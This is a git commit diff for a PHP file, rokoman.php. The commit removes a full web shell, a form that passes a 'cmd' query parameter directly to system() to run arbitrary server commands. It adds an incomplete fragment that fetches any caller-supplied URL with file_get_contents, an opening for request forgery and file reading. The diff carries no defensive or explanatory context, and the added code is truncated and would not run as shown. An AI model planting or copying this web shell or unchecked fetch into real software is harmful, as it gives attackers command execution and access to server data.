9888167b00b1002b3483bbd5678f9ccc7542f336
rokoman13 <35761383+rokoman13@users.noreply.github.com>
2020-06-07 17:37:56 +0500

    Update rokoman.php

--- rokoman.php
+++ rokoman.php
@@ -1,17 +1,2 @@
-<html>
-<body>
-<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
-<input type="TEXT" name="cmd" id="cmd" size="80">
-<input type="SUBMIT" value="Execute">
-</form>
-<pre>
-<?php
-    if(isset($_GET['cmd']))
-    {
-        system($_GET['cmd']);
-    }
-?>
-</pre>
-</body>
-<script>document.getElementById("cmd").focus();</script>
-</html>
+if(isset($_GET['url'])){
+$content=file_get_contents($_GET['url']);
